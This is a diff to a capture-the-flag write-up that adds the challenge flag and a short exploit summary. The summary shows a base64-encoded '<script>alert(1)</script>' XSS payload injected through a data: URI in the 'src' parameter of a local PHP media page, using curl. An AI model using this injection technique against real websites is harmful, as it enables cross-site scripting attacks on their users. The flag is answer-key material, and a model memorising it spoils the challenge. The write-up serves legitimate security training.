@@ -3,6 +3,19 @@
 ## Flag
 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
 
+## Summary
+
+page: `http://localhost:8080/index.php?page=media&src=`
+commands:
+```bash
+# Encode the payload
+echo -n '<script>alert(1)</script>' | base64
+# → PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# Inject via data: URI with base64
+curl "http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" | grep flag
+```
+
 ## Vulnerability Type
 
 **OWASP A03:2021 - Injection** (CWE-79: Cross-Site Scripting via Object Tag)
